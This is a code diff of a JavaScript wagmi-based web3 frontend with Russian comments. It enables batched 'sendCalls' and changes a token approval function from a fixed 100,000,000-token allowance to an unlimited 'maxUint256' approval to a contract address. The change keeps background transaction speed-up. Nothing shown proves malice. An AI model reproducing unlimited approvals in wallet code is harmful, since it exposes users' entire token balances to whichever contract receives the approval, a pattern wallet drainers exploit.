@@ -5,7 +5,7 @@ import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunct
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -621,41 +621,21 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
-
-  // Получаем decimals токена для корректного преобразования
-  const getTokenDecimals = async () => {
-    try {
-      const decimals = await readContract(wagmiConfig, {
-        address: checksumTokenAddress,
-        abi: erc20Abi,
-        functionName: 'decimals',
-        chainId
-      })
-      return Number(decimals)
-    } catch (error) {
-      store.errors.push(`Error fetching decimals for ${tokenAddress} on chain ${chainId}: ${error.message}`)
-      return 18 // Значение по умолчанию для ERC-20
-    }
-  }
-
   try {
-    const decimals = await getTokenDecimals()
-    const amount = parseUnits('100000000', decimals) // 100,000,000 токенов с учетом decimals
-
     const txHash = await writeContract(wagmiConfig, {
       address: checksumTokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
-      args: [checksumContractAddress, amount], // Заменяем maxUint256 на amount
+      args: [checksumContractAddress, maxUint256],
       chainId
     })
-    console.log(`Approve transaction sent for ${amount.toString()} tokens: ${txHash}`)
-
+    console.log(`Approve transaction sent: ${txHash}`)
+    
     // Запускаем мониторинг транзакции в фоне
     monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
       console.error(`Error monitoring transaction ${txHash}:`, error)
     })
-
+    
     return txHash
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
